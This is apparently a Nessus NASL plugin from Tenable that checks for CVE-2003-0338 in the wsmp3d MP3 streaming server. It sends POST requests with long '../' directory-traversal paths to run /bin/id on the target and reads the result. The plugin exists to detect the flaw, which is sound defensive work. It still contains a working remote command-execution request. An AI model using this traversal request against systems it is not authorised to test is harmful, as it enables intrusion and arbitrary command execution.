#
# (C) Tenable Network Security
#
#
# Ref:
# From: "dong-h0un U" <xploit@hackermail.com>
# To: bugtraq@securityfocus.com, full-disclosure@lists.netsys.com, vulnwatch@vulnwatch.org  
# Date: Wed, 21 May 2003 22:13:09 +0800
# Subject: [VulnWatch] [INetCop Security Advisory] WsMP3d Directory Traversing  Vulnerability.
#

if (description)
{
 script_id(11645);
 script_cve_id("CVE-2003-0338");
 script_version ("$Revision: 1.5 $");

 script_name(english:"wsmp3d command execution");
 desc["english"] = "
The remote host is using wsmp3d, a mp3 streaming web server.

There is a flaw in this server which allows anyone to execute arbitrary
commands and read arbitrary files with the privileges this server is
running with.


Solution : None at this time.
Risk factor : High";

 script_description(english:desc["english"]);
 script_summary(english:"Executes /bin/id");
 script_category(ACT_GATHER_INFO);
 script_family(english:"Gain a shell remotely");
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8000);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


ports = add_port_in_list(list:get_kb_list("Services/www"), port:8000);
foreach port (ports)
{
 if ( ! get_http_banner(port:port) ) continue;

 req = http_get(item:"/cmd_ver", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( "WsMp3" >< res ) 
 {
 dirs = get_kb_list(string("www/", port, "/content/directories"));
 if(!isnull(dirs))
 {
  dirs = make_list(dirs);
  dirs = make_list(dirs[0], cgi_dirs());
 }
 else
  dirs = cgi_dirs();

foreach d (dirs)
{
 req = string("POST ", d, "/../../../../../../../../../../../../bin/id HTTP/1.0\r\n\r\n");
 soc = open_sock_tcp(port);
 if(!soc)break;
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 close(soc);
 if("uid=" >< r  && egrep(pattern:"uid=[0-9].*gid=[0-9]", string:r) )
 {
  security_hole(port);
  exit(0);
 }
 if("id: Not implemented" >< r)
 {
  req = string("POST ", d, "/../../../../../../../../../../../../usr/bin/id HTTP/1.0\r\n\r\n");
  soc = open_sock_tcp(port);
  if(!soc)break;
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  if("uid=" >< r && egrep(pattern:"uid=[0-9].*gid=[0-9]", string:r) )
  {
  security_hole(port);
  exit(0);
  }
  }
 }
}
}
